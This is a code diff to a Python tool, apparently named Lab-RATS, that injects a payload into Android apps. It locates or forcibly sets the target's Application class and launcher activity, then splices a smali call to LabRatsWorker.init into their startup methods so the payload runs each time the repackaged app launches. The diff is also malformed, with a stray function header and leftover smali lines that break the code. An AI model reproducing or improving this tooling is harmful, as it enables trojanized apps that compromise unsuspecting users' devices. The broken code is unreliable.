@@ -407,6 +407,64 @@ def merge_manifests(payload_dir, target_dir):
 
 
 def find_launcher_activity(target_dir):
+def find_application_class(target_dir):
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        return None
+    try:
+        tree = ET.parse(manifest_path)
+        root = tree.getroot()
+        package_name = root.attrib.get('package', '')
+        app_elem = root.find('application')
+        if app_elem is not None:
+            app_name = app_elem.attrib.get(f'{{{ANDROID_NS}}}name')
+            if app_name:
+                if app_name.startswith('.'):
+                    app_name = package_name + app_name
+                elif '.' not in app_name:
+                    app_name = package_name + '.' + app_name
+                return app_name
+    except Exception:
+        pass
+    return None
+
+
+def set_fallback_application_class(target_dir):
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        return
+    try:
+        with open(manifest_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+
+        if '<application' in content and 'android:name=' not in content.split('<application')[1].split('>')[0]:
+            content = content.replace('<application', '<application android:name="com.labs.labrats.LabRatsApp"', 1)
+            with open(manifest_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            log_success("Set fallback Application class to com.labs.labrats.LabRatsApp in AndroidManifest.xml")
+    except Exception as e:
+        log_warn(f"Notice setting fallback application class: {e}")
+
+
+def resolve_activity_alias(root, package_name, act_name):
+    """If act_name is an activity-alias, resolve its targetActivity."""
+    app_elem = root.find('application')
+    if app_elem is not None:
+        for alias in app_elem.findall('activity-alias'):
+            name = alias.attrib.get(f'{{{ANDROID_NS}}}name')
+            if name and (name == act_name or name.endswith('.' + act_name.split('.')[-1])):
+                target = alias.attrib.get(f'{{{ANDROID_NS}}}targetActivity')
+                if target:
+                    if target.startswith('.'):
+                        target = package_name + target
+                    elif '.' not in target:
+                        target = package_name + '.' + target
+                    log_info(f"Resolved activity-alias {act_name} -> targetActivity {target}")
+                    return target
+    return act_name
+
+
+def find_launcher_activity(target_dir):
     manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
     tree = ET.parse(manifest_path)
     root = tree.getroot()
@@ -433,14 +491,17 @@ def find_launcher_activity(target_dir):
                     act_name = package_name + act_name
                 elif '.' not in act_name:
                     act_name = package_name + '.' + act_name
-                return act_name
+                return resolve_activity_alias(root, package_name, act_name)
 
     raise RuntimeError("Launcher activity not found in target AndroidManifest.xml")
 
 
-def hook_launcher_activity(target_dir, launcher_class):
-    log_info(f"Injecting Smali hook into Launcher Activity: {launcher_class}")
-    class_rel_path = launcher_class.replace('.', '/') + ".smali"
+def hook_smali_class(target_dir, class_name, is_app_class=False):
+    if not class_name:
+        return False
+
+    log_info(f"Injecting Smali hook into class: {class_name}")
+    class_rel_path = class_name.replace('.', '/') + ".smali"
 
     smali_file = None
     for root, dirs, files in os.walk(target_dir):
@@ -451,13 +512,24 @@ def hook_launcher_activity(target_dir, launcher_class):
                 break
 
     if not smali_file:
-        log_err(f"Could not find smali file for launcher class: {launcher_class}")
-        sys.exit(1)
+        basename = os.path.basename(class_rel_path)
+        for root, dirs, files in os.walk(target_dir):
+            if basename in files:
+                smali_file = os.path.join(root, basename)
+                break
 
-    with open(smali_file, 'r', encoding='utf-8') as f:
+    if not smali_file:
+        log_warn(f"Could not locate smali file for class {class_name}")
+        return False
+
+    with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
         content = f.read()
 
     hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"
+
+    if "Lcom/labs/labrats/LabRatsWorker;->init" in content:
+        log_info(f"Class {class_name} is already hooked.")
+        return True
 
     if "onCreate(" in content:
         def reg_replacer(match):
@@ -470,19 +542,46 @@ def hook_launcher_activity(target_dir, launcher_class):
                     header = header.replace(f".registers {reg_count}", ".registers 2")
             return header + body + hook_code
 
-        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
+        pattern = r'(\.method\s+[^I]*onCreate\([^\n]*\n.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
         if re.search(pattern, content, re.DOTALL):
             content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
-            log_success("Successfully hooked existing onCreate() method with register safety.")
+            log_success(f"Successfully hooked onCreate() in {class_name}")
         else:
-            content = content.replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V\n" + hook_code, 1)
-            log_success("Hook injected into onCreate() method header.")
+            content = re.sub(r'(\.method\s+[^I]*onCreate\([^\n]*\n)', r'\1' + hook_code, content, count=1)
+            log_success(f"Hook injected into onCreate() header in {class_name}")
+    elif "attachBaseContext(" in content:
+        content = re.sub(r'(\.method\s+[^I]*attachBaseContext\([^\n]*\n)', r'\1' + hook_code, content, count=1)
+        log_success(f"Hook injected into attachBaseContext() in {class_name}")
     else:
         new_on_create = f"""
 .method protected onCreate(Landroid/os/Bundle;)V
     .registers 2
 
     invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+{hook_code}
+    return-void
+.endmethod
+"""
+        if ".end class" in content:
+            content = content.replace(".end class", new_on_create + ".end class")
+            log_success(f"Injected new onCreate() method in {class_name}")
+
+    with open(smali_file, 'w', encoding='utf-8') as f:
+        f.write(content)
+
+    return True
+
+
+def hook_launcher_activity(target_dir, launcher_class):
+    # 1. Hook Application class if specified, or set fallback
+    app_class = find_application_class(target_dir)
+    if app_class:
+        hook_smali_class(target_dir, app_class, is_app_class=True)
+    else:
+        set_fallback_application_class(target_dir)
+
+    # 2. Hook Launcher Activity
+    hook_smali_class(target_dir, launcher_class, is_app_class=False)
 {hook_code}
     return-void
 .endmethod
